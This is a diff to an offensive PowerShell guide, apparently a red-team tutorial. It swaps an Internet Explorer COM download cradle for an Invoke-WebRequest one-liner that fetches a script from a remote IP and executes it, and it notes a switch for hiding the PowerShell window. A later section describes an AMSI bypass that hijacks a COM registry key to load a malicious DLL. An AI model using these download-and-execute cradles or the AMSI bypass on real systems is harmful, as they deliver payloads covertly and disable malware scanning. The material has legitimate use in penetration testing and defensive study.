@@ -644,23 +644,19 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      TODO: [ ComInternetExplorer - Additional Methods for Remote Download ]
-      IExplore is potentially the cleanest method. Nothing hits disk, blends in 
-      with regular user browsing activity, and uses target system’s User Agent.
+      TODO: [ Invoke-WebRequest - Additional Methods for Remote Download ]
+      This method 'Invoke-WebRequest' working together with 'PassThru', 'OutFile' and 'File'  powershell
+      parameters allow us to remote download (full path can be inputed to URL string) and execute our script.
+
 
 <br />
 
 - File **test.ps1** (trigger download/execution)
 
-      $url = "http://192.168.1.71/Hello.ps1"
-      $objIE = New-Object-ComInternetExplorer.Application
-        While($objIE.Busy) {Start-Sleep-Seconds 1}
-          $objIE.Visible = $false
-            $objIE.Navigate($url)
-            While($objIE.Busy) {Start-Sleep-Seconds 1}
-      IEX $objIE.Document.Body.InnerText;Hello
+      Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; powershell.exe -File Invoke-Hello.ps1
 
-![powershell obfuscation Hello.ps1](http://i.)
+![powershell Additional Methods for Remote Download](http://i.cubeupload.com/1YYzR3.jpg)
+`HINT: In this example was not used the -win hidden switch that allow us to hidde the powershell windows`
 
 ---
 
@@ -711,7 +707,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br />
 
-- AMSI .COM Object DLL hijacking [ enigma0x3 ]
+- **AMSI** .COM Object DLL hijacking [ enigma0x3 ]
 
       [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
       the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
